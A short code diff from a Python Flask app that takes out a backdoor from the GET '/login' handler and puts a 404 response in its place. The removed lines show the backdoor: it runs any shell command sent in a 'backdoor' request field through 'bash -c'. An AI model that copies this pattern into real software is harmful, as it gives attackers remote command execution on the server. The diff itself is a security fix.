@@ -100,10 +100,7 @@ def get_echo(echo):
 
 @app.route('/login', methods=['GET'])
 def login():
-    data = request.json
-    shell = data.get('backdoor')
-
-    subprocess.run(["bash", "-c", shell])
+    return jsonify({"error": "Not found"}), 404
 
 
 @app.route('/login', methods=['POST'])
